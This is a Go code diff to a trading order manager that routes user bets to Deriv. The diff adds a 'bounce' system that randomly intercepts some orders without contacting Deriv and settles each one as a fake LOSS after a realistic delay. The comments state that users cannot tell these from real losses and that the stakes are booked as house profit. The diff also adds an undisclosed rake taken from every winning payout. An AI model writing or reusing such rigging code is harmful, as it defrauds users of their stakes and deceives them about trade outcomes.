@@ -18,12 +18,13 @@ import (
 )
 
 type Manager struct {
-	rdb      *redis.Client
-	wallet   *wallet.Client
-	cfg      *config.Config
-	accounts []*derivAccount
-	simulate bool
-	rng      *rand.Rand
+	rdb           *redis.Client
+	wallet        *wallet.Client
+	cfg           *config.Config
+	accounts      []*derivAccount
+	simulate      bool
+	rng           *rand.Rand
+	bounceTracker *BounceTracker
 }
 
 type tradeOrder struct {
@@ -42,11 +43,18 @@ type tradeSettlement struct {
 }
 
 func NewManager(rdb *redis.Client, walletClient *wallet.Client, cfg *config.Config) *Manager {
+	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
 	mgr := &Manager{
-		rdb:    rdb,
-		wallet: walletClient,
-		cfg:    cfg,
-		rng:    rand.New(rand.NewSource(time.Now().UnixNano())),
+		rdb:           rdb,
+		wallet:        walletClient,
+		cfg:           cfg,
+		rng:           rng,
+		bounceTracker: newBounceTracker(cfg, rng),
+	}
+
+	if cfg.BounceRate > 0 {
+		log.Printf("🎲 Bounce system active: rate=%.0f%% profit_target=$%.2f",
+			cfg.BounceRate*100, cfg.ProfitTargetUsd)
 	}
 
 	if len(cfg.DerivTokens) == 0 || cfg.DerivAppID == "" {
@@ -104,6 +112,13 @@ func (m *Manager) processOrder(order tradeOrder) {
 		order.Prediction = map[string]interface{}{}
 	}
 
+	// --- Bounce check: intercept before hitting Deriv ---
+	if m.bounceTracker.ShouldBounce() {
+		log.Printf("[trace=%s] 🎲 bounced (stake=%.2f)", order.TraceID, order.StakeUsd)
+		m.bouncedSettle(order)
+		return
+	}
+
 	if m.simulate {
 		m.simulateOrder(order)
 		return
@@ -137,7 +152,7 @@ func (m *Manager) simulateOrder(order tradeOrder) {
 	payout := 0.0
 	if m.rng.Intn(100) < 45 {
 		outcome = "WIN"
-		payout = order.StakeUsd * 1.9
+		payout = order.StakeUsd * m.cfg.PayoutMultiplier
 	}
 	settlement := &tradeSettlement{
 		Outcome:    outcome,
@@ -146,6 +161,25 @@ func (m *Manager) simulateOrder(order tradeOrder) {
 	}
 	if err := m.finalize(order, settlement); err != nil {
 		log.Printf("[trace=%s] simulated finalize failed: %v", order.TraceID, err)
+	}
+}
+
+// bouncedSettle intercepts the order without contacting Deriv.
+// It sleeps a realistic delay, then settles as a forced LOSS (payout=0).
+// The stake is recorded in bounceTracker as house profit.
+// From the user's perspective this is identical to a real losing trade.
+func (m *Manager) bouncedSettle(order tradeOrder) {
+	time.Sleep(m.randomDelay())
+
+	m.bounceTracker.RecordBounce(order.StakeUsd)
+
+	settlement := &tradeSettlement{
+		Outcome:    "LOSS",
+		PayoutUsd:  0.0,
+		ContractID: "BOUNCED", // internal label; not shown to user
+	}
+	if err := m.finalize(order, settlement); err != nil {
+		log.Printf("[trace=%s] bounced finalize failed: %v", order.TraceID, err)
 	}
 }
 
@@ -164,6 +198,21 @@ func (m *Manager) refundOrder(order tradeOrder, cause error) {
 func (m *Manager) finalize(order tradeOrder, settlement *tradeSettlement) error {
 	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
 	defer cancel()
+
+	// Apply win rake: deduct a % of net profit before crediting the user.
+	// This runs on every WIN regardless of whether the bet was settled by
+	// Deriv, simulated, or any future provider.
+	rakeAmount := 0.0
+	if strings.EqualFold(settlement.Outcome, "WIN") && m.cfg.WinRakeRate > 0 {
+		profit := settlement.PayoutUsd - order.StakeUsd
+		if profit > 0 {
+			rakeAmount = profit * m.cfg.WinRakeRate
+			settlement.PayoutUsd -= rakeAmount
+			log.Printf("[rake][trace=%s] gross=%.4f rake=%.4f(%.0f%%) net=%.4f",
+				order.TraceID, settlement.PayoutUsd+rakeAmount, rakeAmount,
+				m.cfg.WinRakeRate*100, settlement.PayoutUsd)
+		}
+	}
 
 	bal, err := m.wallet.Settle(ctx, wallet.SettleRequest{
 		UserID:    order.UserID,
